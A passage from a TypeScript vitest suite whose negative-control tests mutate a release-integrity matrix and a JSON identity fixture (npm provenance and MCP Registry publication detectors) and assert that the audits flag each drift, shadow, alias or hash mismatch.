        expect.stringMatching(
          /release mutation hybrid case release\.case\.m153 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m154 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m154 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m155 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m155 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m156 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m156 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m157 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m157 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m158 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m158 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m159 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m159 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m160 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m160 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m161 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m161 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m162 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m162 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m163 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m163 disagrees with its exact frozen identity/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m164 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m164 disagrees with its exact frozen identity/
        )
      ])
    );

    const declarativeDescriptorDrift = replaceExactly(
      matrixSource,
      [
        '    const releaseMutationM002 = releaseMutationPlan.registerMutation("release.m002", {',
        '      mode: "first",',
        "      source: releaseIntegritySource"
      ].join("\n"),
      [
        '    const releaseMutationM002 = releaseMutationPlan.registerMutation("release.m002", {',
        '      mode: "all",',
        "      source: releaseIntegritySource"
      ].join("\n")
    );
    expect(historicalMutationProblems(declarativeDescriptorDrift)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid descriptor release\.m002 mode disagrees with frozen identity/)
      ])
    );

    const semanticSwapFirst = replaceExactly(
      matrixSource,
      [
        '    const releaseMutationM002 = releaseMutationPlan.registerMutation("release.m002", {',
        '      mode: "first",',
        "      source: releaseIntegritySource"
      ].join("\n"),
      [
        '    const releaseMutationM002 = releaseMutationPlan.registerMutation("release.swap", {',
        '      mode: "first",',
        "      source: releaseIntegritySource"
      ].join("\n")
    );
    const semanticSwapSecond = replaceExactly(
      semanticSwapFirst,
      [
        '    const releaseMutationM003 = releaseMutationPlan.registerMutation("release.m003", {',
        '      mode: "first",',
        "      source: releaseIntegritySource"
      ].join("\n"),
      [
        '    const releaseMutationM003 = releaseMutationPlan.registerMutation("release.m002", {',
        '      mode: "first",',
        "      source: releaseIntegritySource"
      ].join("\n")
    );
    const declarativeSemanticSwap = replaceExactly(
      semanticSwapSecond,
      [
        '    const releaseMutationM002 = releaseMutationPlan.registerMutation("release.swap", {',
        '      mode: "first",',
        "      source: releaseIntegritySource"
      ].join("\n"),
      [
        '    const releaseMutationM002 = releaseMutationPlan.registerMutation("release.m003", {',
        '      mode: "first",',
        "      source: releaseIntegritySource"
      ].join("\n")
    );
    expect(historicalMutationProblems(declarativeSemanticSwap)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid descriptor release\.m002 disagrees with its exact frozen semantics/
        ),
        expect.stringMatching(
          /release mutation hybrid descriptor release\.m003 disagrees with its exact frozen semantics/
        )
      ])
    );

    const declarativeRootTransplant = replaceExactly(
      matrixSource,
      [
        "    releaseMutationPlan.registerCase({",
        '      id: "release.case.m002",',
        "      root: releaseMutationM002,"
      ].join("\n"),
      [
        "    releaseMutationPlan.registerCase({",
        '      id: "release.case.m002",',
        "      root: releaseMutationM004,"
      ].join("\n")
    );
    expect(historicalMutationProblems(declarativeRootTransplant)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m002 invocation must retain its exact frozen oracle adapter/
        ),
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m002 disagrees with its exact frozen identity/
        )
      ])
    );

    const declarativeInvocationDrift = replaceExactly(
      matrixSource,
      [
        "          invoke: {",
        '            kind: "registry.evaluator",',
        "            baseline: releaseIntegritySource,",
        "            mutant: releaseMutationM002"
      ].join("\n"),
      [
        "          invoke: {",
        '            kind: "registry.evaluator",',
        "            baseline: releaseMutationM002,",
        "            mutant: releaseMutationM002"
      ].join("\n")
    );
    expect(historicalMutationProblems(declarativeInvocationDrift)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid case release\.case\.m002 invocation must retain its exact frozen oracle adapter/
        )
      ])
    );

    const declarativeAliasDrift = replaceExactly(
      matrixSource,
      [
        "    const releaseIntegrityText = mcpbInputs.integrity;",
        "    const releaseMutationPlan = new ReleaseMutationPlan({"
      ].join("\n"),
      [
        "    const releaseIntegrityText = mcpbInputs.release;",
        "    const releaseMutationPlan = new ReleaseMutationPlan({"
      ].join("\n")
    );
    const declarativeSourceDrift = replaceExactly(
      declarativeAliasDrift,
      [
        '    const releaseIntegritySource = releaseMutationPlan.registerSource("script.release-integrity", releaseIntegrityText);',
        '    const releaseMutationM002 = releaseMutationPlan.registerMutation("release.m002", {'
      ].join("\n"),
      [
        '    const releaseIntegritySource = releaseMutationPlan.registerSource("script.release-integrity", mcpbInputs.release);',
        '    const releaseMutationM002 = releaseMutationPlan.registerMutation("release.m002", {'
      ].join("\n")
    );
    const npmPreludeOrderDrift = replaceExactly(
      declarativeSourceDrift,
      [
        "    expect(npmProvenanceContractProblems(mcpbInputs.release, mcpbInputs.integrity)).toEqual([]);",
        "    expect(npmProvenanceEvaluatorProblems(mcpbInputs.integrity)).toEqual([]);"
      ].join("\n"),
      [
        "    expect(npmProvenanceEvaluatorProblems(mcpbInputs.integrity)).toEqual([]);",
        "    expect(npmProvenanceContractProblems(mcpbInputs.release, mcpbInputs.integrity)).toEqual([]);"
      ].join("\n")
    );
    const npmEvaluatorBaselineDrift = replaceExactly(
      npmPreludeOrderDrift,
      "    expect(npmProvenanceEvaluatorProblems(mcpbInputs.integrity)).toEqual([]);",
      "    expect(npmProvenanceWorkflowProblems(mcpbInputs.integrity)).toEqual([]);"
    );
    const declarativeExecuteAdapterDrift = replaceExactly(
      npmEvaluatorBaselineDrift,
      [
        "    releaseMutationPlan.executeThrough(releaseMutationM037, {",
        "      registryEvaluatorProblems: mcpRegistryEvaluatorProblems,",
        "      registryStepProblems: mcpRegistryRunProblems,",
        "      npmContractProblems: npmProvenanceContractProblems,",
        "      npmEvaluatorProblems: npmProvenanceEvaluatorProblems,",
        "      npmWorkflowProblems: npmProvenanceWorkflowProblems",
        "    });"
      ].join("\n"),
      [
        "    releaseMutationPlan.executeThrough(releaseMutationM037, {",
        "      registryEvaluatorProblems: mcpRegistryContractProblems,",
        "      registryStepProblems: mcpRegistryRunProblems,",
        "      npmContractProblems: mcpRegistryRunProblems,",
        "      npmEvaluatorProblems: mcpRegistryRunProblems,",
        "      npmWorkflowProblems: mcpRegistryRunProblems",
        "    });"
      ].join("\n")
    );
    const npmDetectorBodyDrift = replaceExactly(
      declarativeExecuteAdapterDrift,
      "function npmProvenanceContractProblems(release: string, integrity: string): string[] {",
      "function npmProvenanceContractProblems(release: string, integrity: string): string[] { /* drift */"
    );
    const npmWorkflowDetectorBodyDrift = replaceExactly(
      npmDetectorBodyDrift,
      "function npmProvenanceWorkflowProblems(release: string): string[] {",
      "function npmProvenanceWorkflowProblems(release: string): string[] { /* drift */"
    );
    const npmEvaluatorDetectorBodyDrift = replaceExactly(
      npmWorkflowDetectorBodyDrift,
      "function npmProvenanceEvaluatorProblems(integrity: string): string[] {",
      "function npmProvenanceEvaluatorProblems(integrity: string): string[] { /* drift */"
    );
    const npmProblemPreludeDrift = replaceExactly(
      npmEvaluatorDetectorBodyDrift,
      [
        "const NPM_PROVENANCE_CONTRACT_PROBLEM =",
        '  "npm provenance must bind the tag-push context before the sole publish " +',
        '  "and verify two exact attestations without credentials";'
      ].join("\n"),
      [
        "const NPM_PROVENANCE_CONTRACT_PROBLEM =",
        '  "npm provenance may bind an approximate tag context before publication " +',
        '  "and verify one attestation with credentials";'
      ].join("\n")
    );
    const registryDetectorBodyDrift = replaceExactly(
      npmProblemPreludeDrift,
      "function mcpRegistryEvaluatorProblems(integrity: string): string[] {",
      "function mcpRegistryEvaluatorProblems(source: string): string[] {"
    );
    const registryProblemPreludeDrift = replaceExactly(
      registryDetectorBodyDrift,
      [
        "const MCP_REGISTRY_EVALUATOR_CONTRACT_PROBLEM =",
        '  "MCP Registry reconciliation must retain exact identity, lifecycle, absence, and convergence semantics";'
      ].join("\n"),
      [
        "const MCP_REGISTRY_EVALUATOR_CONTRACT_PROBLEM =",
        '  "MCP Registry reconciliation must retain approximate identity, lifecycle, absence, and convergence semantics";'
      ].join("\n")
    );
    const registryRunBodyDrift = replaceExactly(
      registryProblemPreludeDrift,
      "function mcpRegistryRunProblems(run: string, integrity: string): string[] {",
      "function mcpRegistryRunProblems(run: string, integrity: string): string[] { /* drift */"
    );
    const registryStepBodyDrift = replaceExactly(
      registryRunBodyDrift,
      "function mcpRegistryStepProblems(step: YamlRecord | undefined, integrity: string): string[] {",
      "function mcpRegistryStepProblems(step: YamlRecord | undefined, integrity: string): string[] { /* drift */"
    );
    const registryWorkflowProblemDrift = replaceExactly(
      registryStepBodyDrift,
      [
        "const MCP_REGISTRY_WORKFLOW_CONTRACT_PROBLEM =",
        '  "stable MCP Registry publication must bind exact source manifests, one pinned publisher write, and bounded readback";'
      ].join("\n"),
      [
        "const MCP_REGISTRY_WORKFLOW_CONTRACT_PROBLEM =",
        '  "stable MCP Registry publication may bind approximate source manifests, one publisher write, and readback";'
      ].join("\n")
    );
    const registryDetectorAliasDrift =
      `${registryWorkflowProblemDrift}\nconst registryEvaluatorAlias = mcpRegistryEvaluatorProblems;\n` +
      "const npmContractAlias = npmProvenanceContractProblems;\n" +
      "const npmEvaluatorAlias = npmProvenanceEvaluatorProblems;\n" +
      "const npmWorkflowAlias = npmProvenanceWorkflowProblems;\n" +
      "const registryStepAlias = mcpRegistryStepProblems;\n" +
      "const registryRunAlias = mcpRegistryRunProblems;\n";
    expect(crossGenerationMutationProblems(registryDetectorAliasDrift)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid alias must be exact const releaseIntegrityText = mcpbInputs\.integrity/
        ),
        expect.stringMatching(
          /release mutation hybrid sources must bind releaseIntegritySource\/script\.release-integrity/
        ),
        expect.stringMatching(
          /release mutation hybrid prelude must retain one exact clean npm provenance evaluator assertion/
        ),
        expect.stringMatching(
          /release mutation hybrid prelude must retain one exact clean npm provenance contract assertion/
        ),
        expect.stringMatching(
          /release mutation hybrid execute adapter must bind registryEvaluatorProblems exactly to mcpRegistryEvaluatorProblems/
        ),
        expect.stringMatching(
          /release mutation hybrid npm evaluator requires one exact clean baseline assertion; found 0/
        ),
        expect.stringMatching(
          /release mutation hybrid execute adapter must bind npmContractProblems exactly to npmProvenanceContractProblems/
        ),
        expect.stringMatching(
          /release mutation hybrid execute adapter must bind npmEvaluatorProblems exactly to npmProvenanceEvaluatorProblems/
        ),
        expect.stringMatching(
          /release mutation hybrid execute adapter must bind npmWorkflowProblems exactly to npmProvenanceWorkflowProblems/
        ),
        expect.stringMatching(
          /release mutation hybrid pinned npmProvenanceContractProblems AST node must retain exact SHA-256/
        ),
        expect.stringMatching(
          /release mutation hybrid pinned npmProvenanceEvaluatorProblems AST node must retain exact SHA-256/
        ),
        expect.stringMatching(
          /release mutation hybrid pinned npmProvenanceWorkflowProblems AST node must retain exact SHA-256/
        ),
        expect.stringMatching(
          /release mutation hybrid pinned npm provenance problem AST node must retain exact SHA-256/
        ),
        expect.stringMatching(
          /release mutation hybrid npm contract binding must have no aliases, writes, or indirect references/
        ),
        expect.stringMatching(
          /release mutation hybrid npm evaluator binding must have no aliases, writes, or indirect references/
        ),
        expect.stringMatching(
          /release mutation hybrid npm workflow binding must have no aliases, writes, or indirect references/
        ),
        expect.stringMatching(
          /release mutation hybrid pinned mcpRegistryEvaluatorProblems AST node must retain exact SHA-256/
        ),
        expect.stringMatching(/release mutation hybrid pinned registry problem AST node must retain exact SHA-256/),
        expect.stringMatching(
          /release mutation hybrid registry evaluator binding must have no aliases, writes, or indirect references/
        ),
        expect.stringMatching(
          /release mutation hybrid pinned mcpRegistryRunProblems AST node must retain exact SHA-256/
        ),
        expect.stringMatching(
          /release mutation hybrid registry run binding must have no aliases, writes, or indirect references/
        ),
        expect.stringMatching(
          /release mutation hybrid pinned mcpRegistryStepProblems AST node must retain exact SHA-256/
        ),
        expect.stringMatching(
          /release mutation hybrid pinned registry workflow problem AST node must retain exact SHA-256/
        ),
        expect.stringMatching(
          /release mutation hybrid registry step binding must have no aliases, writes, or indirect references/
        )
      ])
    );

    const registryStepShadow =
      `${matrixSource}\nfunction registryStepShadowControl(): void {\n` +
      "  const mcpRegistryStepProblems = (_step: YamlRecord | undefined, _integrity: string): string[] => [];\n" +
      "  void mcpRegistryStepProblems;\n}\n";
    expect(historicalMutationProblems(registryStepShadow)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid registry step binding must have one top-level declaration and no runtime shadows; found 1\/1/
        )
      ])
    );
    const registryStepWrite =
      `${matrixSource}\nmcpRegistryStepProblems = ` +
      "(_step: YamlRecord | undefined, _integrity: string): string[] => [];\n";
    expect(historicalMutationProblems(registryStepWrite)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid registry step binding must have no aliases, writes, or indirect references; found 0\/1\//
        )
      ])
    );
    const registryStepIndirectReference = `${matrixSource}\nvoid [mcpRegistryStepProblems];\n`;
    expect(historicalMutationProblems(registryStepIndirectReference)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid registry step binding must have no aliases, writes, or indirect references; found 0\/0\/1/
        )
      ])
    );

    const mutationMatchCountBodyDrift = replaceExactly(
      matrixSource,
      "    count++;\n    offset = match + needle.length;",
      "    count += 2;\n    offset = match + needle.length;"
    );
    expect(historicalMutationProblems(mutationMatchCountBodyDrift)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid pinned mutationMatchCount AST node must retain exact SHA-256/)
      ])
    );

    const mutationMatchCountShadow = `${matrixSource}\nfunction mutationMatchCountShadow(): void {\n  const mutationMatchCount = () => 0;\n  void mutationMatchCount;\n}\n`;
    expect(historicalMutationProblems(mutationMatchCountShadow)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid mutationMatchCount binding must have one top-level declaration and no runtime shadows; found 1\/1/
        )
      ])
    );

    const mutationMatchCountAlias = `${matrixSource}\nconst mutationCounterAlias = mutationMatchCount;\nvoid mutationCounterAlias;\n`;
    expect(historicalMutationProblems(mutationMatchCountAlias)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid mutationMatchCount must have no aliases; found 1 alias initializer/
        )
      ])
    );

    const mutationMatchCountWrite = `${matrixSource}\nmutationMatchCount = (_source: string, _needle: string) => 0;\n`;
    expect(historicalMutationProblems(mutationMatchCountWrite)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid mutationMatchCount binding must never be reassigned; found 1 write/
        )
      ])
    );

    const mutationMatchCountIndirect = `${matrixSource}\nvoid [mutationMatchCount];\n`;
    expect(historicalMutationProblems(mutationMatchCountIndirect)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid mutationMatchCount may only be called directly with two arguments; found 1 other reference/
        )
      ])
    );

    const loopBodyMutation = replaceExactly(
      matrixSource,
      "    ]) {\n      expect(npmProvenanceEvaluatorProblems(weakenedProvenanceEvaluator)).toContain(",
      '    ]) {\n      void replaceExactly(mcpbInputs.integrity, "loop-body", "mutant");\n' +
        '      ["mapped"].map(() => replaceExactly(mcpbInputs.integrity, "mapped", "mutant"));\n' +
        "      expect(npmProvenanceEvaluatorProblems(weakenedProvenanceEvaluator)).toContain("
    );
    expect(historicalMutationProblems(loopBodyMutation)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/matrix AST execution-multiplying mutation helper sites must be zero; found 2/)
      ])
    );

    const unsupportedExpressionMutation = replaceExactly(
      matrixSource,
      "replaceExactly(registryRun, 'mcp-registry-state \"$phase\"', 'mcp-registry-read \"$phase\"')",
      'replaceExactly(true ? registryRun : "", true ? \'mcp-registry-state "$phase"\' : "x", [\'mcp-registry-read "$phase"\'][0])'
    );
    expect(historicalMutationProblems(unsupportedExpressionMutation)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/legacy source expression .* is outside outer-expression-v1/),
        expect.stringMatching(/legacy needle expression .* is outside outer-expression-v1/),
        expect.stringMatching(/legacy replacement expression .* is outside outer-expression-v1/)
      ])
    );

    const duplicateTopLevelKey = replaceExactly(
      fixtureBefore,
      '"schemaVersion": 2,',
      '"schemaVersion": 2,\n  "schemaVersion": 2,'
    );
    const duplicateKeyProblems = historicalFixtureMutationProblems(duplicateTopLevelKey);
    expect(duplicateKeyProblems).toEqual([
      expect.stringMatching(/duplicate JSON key schemaVersion/),
      expect.stringMatching(/release mutation identity fixture must remain byte-exact SHA-256/)
    ]);

    const referencedDeclarationDrift = replaceExactly(
      matrixSource,
      `const NPM_PROVENANCE_AUDIT_COMMAND = '"$TIMEOUT_BIN" --kill-after=10s 120s "$NODE_BIN" "$NPM_CLI_JS" audit signatures';`,
      `const NPM_PROVENANCE_AUDIT_COMMAND = '"$TIMEOUT_BIN" --kill-after=10s 120s "$NODE_BIN" "$NPM_CLI_JS" audit signaturez';`
    );
    const beforeSourceCatalogueDrift = preparedAudit.telemetry();
    expect(historicalMutationProblems(referencedDeclarationDrift)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/manifest source row 7 disagrees with the exact reviewed catalogue identity/)
      ])
    );
    const afterSourceCatalogueDrift = preparedAudit.telemetry();
    expect(afterSourceCatalogueDrift.sourceCatalogueBypasses).toBe(
      beforeSourceCatalogueDrift.sourceCatalogueBypasses + 1
    );
    expect(afterSourceCatalogueDrift.materializedGraphReuses).toBe(beforeSourceCatalogueDrift.materializedGraphReuses);

    // The frozen Registry-step and npm-contract primary invocations are directional
    // ordered pairs, not unordered bags: each mutated slot and clean companion stay exact.
    const releaseOracleCompanionControl = JSON.parse(fixtureBefore) as MutableIdentityControlManifest;
    const registryStepRunCheck = identityControlCheck(releaseOracleCompanionControl, "registry.step.run");
    const registryStepIntegrityCheck = identityControlCheck(releaseOracleCompanionControl, "registry.step.integrity");
    const npmContractReleaseCheck = identityControlCheck(releaseOracleCompanionControl, "npm.contract.release");
    const npmContractIntegrityCheck = identityControlCheck(releaseOracleCompanionControl, "npm.contract.integrity");
    expect(registryStepRunCheck.invoke.inputs.arguments).toEqual([
      { kind: "mutant", slot: "run" },
      { id: "script.release-integrity", kind: "source", slot: "integrity" }
    ]);
    expect(registryStepIntegrityCheck.invoke.inputs.arguments).toEqual([
      { id: "workflow.registry-publish-step", kind: "source", slot: "run" },
      { kind: "mutant", slot: "integrity" }
    ]);
    expect(npmContractReleaseCheck.invoke.inputs.arguments).toEqual([
      { kind: "mutant", slot: "release" },
      { id: "script.release-integrity", kind: "source", slot: "integrity" }
    ]);
    expect(npmContractIntegrityCheck.invoke.inputs.arguments).toEqual([
      { id: "fixture.release-workflow", kind: "source", slot: "release" },
      { kind: "mutant", slot: "integrity" }
    ]);

    // NEGATIVE control: swapping every companion order must fail all four closed
    // invocation signatures even though every individual source identity remains.
    registryStepRunCheck.invoke.inputs.arguments.reverse();
    registryStepIntegrityCheck.invoke.inputs.arguments.reverse();
    npmContractReleaseCheck.invoke.inputs.arguments.reverse();
    npmContractIntegrityCheck.invoke.inputs.arguments.reverse();
    expect(historicalFixtureMutationProblems(JSON.stringify(releaseOracleCompanionControl))).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation identity fixture must remain byte-exact SHA-256/),
        expect.stringMatching(/inputs\.arguments disagree with the exact registry\.step\.run detector signature/),
        expect.stringMatching(/inputs\.arguments disagree with the exact registry\.step\.integrity detector signature/),
        expect.stringMatching(/inputs\.arguments disagree with the exact npm\.contract\.release detector signature/),
        expect.stringMatching(/inputs\.arguments disagree with the exact npm\.contract\.integrity detector signature/)
      ])
    );

    const tampered = JSON.parse(fixtureBefore) as MutableIdentityControlManifest;
    const contentBoundSource = tampered.sources.find((source) => source.id === "fragment.npm-provenance-audit-command");
    if (contentBoundSource === undefined) throw new Error("release identity fixture has no retained content source");
    const unrelatedSource = tampered.sources[1];
    if (unrelatedSource === undefined) throw new Error("release identity fixture has no unrelated source identity");
    const firstMutation = firstIdentityEntry(tampered.mutations, "mutation identities");
    const dependencySplitMutation = tampered.mutations.find((mutation) => mutation.id === "release.m038");
    if (dependencySplitMutation === undefined) throw new Error("release identity fixture has no release.m038");
    const firstCase = firstIdentityEntry(tampered.cases, "case identities");
    const firstCheck = firstIdentityEntry(firstCase.checks, "case checks");
    contentBoundSource.contentSha256 = "0".repeat(64);
    firstMutation.expressions.needle.raw += " /* manifest raw-expression drift */";
    firstMutation.expressions.needle.resolved += "\n# resolved-needle drift";
    firstMutation.expressions.source.resolved = unrelatedSource.id;
    dependencySplitMutation.replacementDependency = "release.m037";
    firstCheck.invoke.kind = "release.poll";
    firstCheck.invoke.inputs.callee = "unreviewedDetector";
    firstCheck.expectation.regex = "workflow.schema.unreviewed-regex";
    const tamperProblems = historicalFixtureMutationProblems(JSON.stringify(tampered));
    expect(tamperProblems).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation identity fixture must remain byte-exact SHA-256/),
        expect.stringMatching(/release mutation hybrid dependency edge release\.m037->release\.m038 crosses/),
        expect.stringMatching(
          /manifest source fragment\.npm-provenance-audit-command semanticFingerprint must be sha256:/
        ),
        expect.stringMatching(/manifest mutation release\.m001 resolved source must equal workflow\.release-raw/),
        expect.stringMatching(/manifest mutation release\.m001 semanticFingerprint must be sha256:/),
        expect.stringMatching(/manifest mutation release\.m038 semanticFingerprint must be sha256:/),
        expect.stringMatching(/manifest case release\.case\.m001 semanticFingerprint must be sha256:/),
        expect.stringMatching(/baseline must equal release\.poll mutant source fixture\.release-workflow/),
        expect.stringMatching(/inputs\.callee must be releasePollProblems/),
        expect.stringMatching(/inputs\.arguments disagree with the exact release\.poll detector signature/),
        expect.stringMatching(/uses an unknown named-regex identity/)
      ])
    );

    // Prepared execution is order-independent and returns fresh diagnostics on every call.
    const secondRepeatedProblems = historicalMutationProblems(outsideSliceCommentDrift);
    expect(secondRepeatedProblems).toEqual(stableRepeatedProblems);
    firstRepeatedProblems.push("caller-owned sentinel");
    expect(secondRepeatedProblems).toEqual(stableRepeatedProblems);
    expect(secondRepeatedProblems).toEqual(
      diagnosticMultisetDifference(
        releaseMutationIdentityAuditProblems(outsideSliceCommentDrift, fixtureBefore),
        historicalBaselineProblems
      )
    );
    const finalHistoricalTelemetry = preparedAudit.telemetry();
    expect(finalHistoricalTelemetry.fixturePreparations).toBe(1);
    expect(finalHistoricalTelemetry.sourceCatalogueBypasses).toBeGreaterThan(0);
  }, 720_000);

  it("every *-invariant.test.ts file has NEGATIVE control OR explicit exempt marker", async () => {
    const focusTimeoutSource = await fs.readFile(path.join(repoRoot, FOCUS_TIMEOUT_FILENAME), "utf8");
    const focusTimeoutProblems = focusTimeoutRegistrationProblems(focusTimeoutSource);
    expect(focusTimeoutProblems, focusTimeoutProblems.join("\n")).toEqual([]);

    const exactSource = [
      'import { beforeAll, describe } from "vitest";',
      `describe(${JSON.stringify(FOCUS_TIMEOUT_SUITE_TITLE)}, () => {`,
      "  beforeAll(async () => {}, 45_000);",
      "});"
    ].join("\n");
    expect(focusTimeoutRegistrationProblems(exactSource)).toEqual([]);

    const inheritedTimeout = replaceExactly(exactSource, "45_000", "15_000");
    const underBufferedTimeout = replaceExactly(exactSource, "45_000", "30_000");
    const missingTimeout = replaceExactly(exactSource, ", 45_000);", ");");
    const raisedTimeout = replaceExactly(exactSource, "45_000", "45_001");
    const synchronousCallback = replaceExactly(exactSource, "beforeAll(async () =>", "beforeAll(() =>");
    const registrationAfterReturn = replaceExactly(exactSource, "  beforeAll(", "  return;\n  beforeAll(");
    const eagerPrefixArgument = replaceExactly(
      exactSource,
      "  beforeAll(",
      '  (() => { throw new Error("abort collection"); })();\n  beforeAll('
    );
    for (const candidate of [
      inheritedTimeout,
      underBufferedTimeout,
      missingTimeout,
      raisedTimeout,
      synchronousCallback,
      registrationAfterReturn,
      eagerPrefixArgument
    ]) {
      expect(focusTimeoutRegistrationProblems(candidate)).toContain(FOCUS_TIMEOUT_REGISTRATION_PROBLEM);
    }

    const aliasedBeforeAll = replaceExactly(
      exactSource,
      'import { beforeAll, describe } from "vitest";',
      'import { beforeAll as authenticBeforeAll, describe } from "vitest";\nconst beforeAll = authenticBeforeAll;'
    );
    expect(focusTimeoutRegistrationProblems(aliasedBeforeAll)).toContain(
      `${FOCUS_TIMEOUT_FILENAME} must bind beforeAll through one direct unaliased runtime vitest named import ` +
        "and no competing runtime bindings; found direct 0, competing 1"
    );

    const shadowedBeforeAll = replaceExactly(
      exactSource,
      "\n});",
      "\n  function beforeAll(..._args: unknown[]): void {}\n});"
    );
    expect(focusTimeoutRegistrationProblems(shadowedBeforeAll)).toContain(
      `${FOCUS_TIMEOUT_FILENAME} must bind beforeAll through one direct unaliased runtime vitest named import ` +
        "and no competing runtime bindings; found direct 1, competing 1"
    );

    const aliasedDescribe = replaceExactly(
      exactSource,
      'import { beforeAll, describe } from "vitest";',
      'import { beforeAll, describe as authenticDescribe } from "vitest";\nconst describe = authenticDescribe;'
    );
    expect(focusTimeoutRegistrationProblems(aliasedDescribe)).toContain(
      `${FOCUS_TIMEOUT_FILENAME} must bind describe through one direct unaliased runtime vitest named import ` +
        "and no competing runtime bindings; found direct 0, competing 1"
    );

    const shadowedDescribe = `${exactSource}\nfunction describe(..._args: unknown[]): void {}`;
    expect(focusTimeoutRegistrationProblems(shadowedDescribe)).toContain(
      `${FOCUS_TIMEOUT_FILENAME} must bind describe through one direct unaliased runtime vitest named import ` +
        "and no competing runtime bindings; found direct 1, competing 1"
    );

    const completeSet = new Set<string>(EXPECTED_STRUCTURAL_FILES);
    const missingReleaseIntegrity = new Set(completeSet);
    missingReleaseIntegrity.delete("release-integrity.test.ts");
    expect(() => assertStructuralFileMembership(completeSet)).not.toThrow();
    expect(() => assertStructuralFileMembership(missingReleaseIntegrity)).toThrow(
      /structural invariant census mismatch \(missing: release-integrity\.test\.ts\)/
    );
    const oneForOneSwap = new Set(completeSet);
    oneForOneSwap.delete("abs-path-leak-invariant.test.ts");
    oneForOneSwap.add("replacement-invariant.test.ts");
    expect(() => assertStructuralFileMembership(oneForOneSwap)).toThrow(
      /missing: abs-path-leak-invariant\.test\.ts; unexpected: replacement-invariant\.test\.ts/
    );

    expect(() => replaceExactly("alpha", "missing", "omega")).toThrow(/expected 1 occurrence\(s\), found 0/);
    expect(() => replaceExactly("alpha alpha", "alpha", "omega")).toThrow(/expected 1 occurrence\(s\), found 2/);
    expect(() => replaceAllExactly("alpha", "missing", "omega")).toThrow(/expected 1 occurrence\(s\), found 0/);
    expect(() => replaceExactly("alpha", "", "omega")).toThrow(/must not be empty/);
    expect(() => replaceExactly("alpha", "alpha", "omega", 0)).toThrow(/positive safe integer/);
    expect(() => replaceExactly("alpha", "alpha", "omega", 1.5)).toThrow(/positive safe integer/);
    expect(() => replaceExactly("alpha", "alpha", "alpha")).toThrow(/did not change its source/);
    expect(() => replaceAllExactly("alpha", "alpha", "alpha")).toThrow(/did not change its source/);
    expect(replaceExactly("alpha alpha", "alpha", "omega", 2)).toBe("omega alpha");
    expect(replaceAllExactly("alpha alpha", "alpha", "omega", 2)).toBe("omega omega");
    expect(replaceExactly("left alpha right", "alpha", "$`|$&|$'|$$")).toBe("left left |alpha| right|$ right");
    expect(replaceExactly("alpha", "alpha", "$1|$01|$<name>|$0")).toBe("$1|$01|$<name>|$0");
    expect(() => replaceExactly("alpha", "alpha", "$&")).toThrow(/did not change its source/);
    expect(replaceAllExactly("a-a", "a", "$`|$&|$'", 2)).toBe("|a|-a-a-|a|");
    expect(replaceIntegerAllExactly("7 17 7", 7, "70", 2)).toBe("70 17 70");
    expect(() => replaceIntegerAllExactly("17", 7, "70", 1)).toThrow(/expected 1 bounded occurrence\(s\), found 0/);
    expect(() => replaceIntegerAllExactly("7 7", 7, "70", 1)).toThrow(/expected 1 bounded occurrence\(s\), found 2/);
    expect(() => replaceIntegerAllExactly("7", 7, "7", 1)).toThrow(/did not change its source/);
    expect(
      exactMutationHelperCallCount(
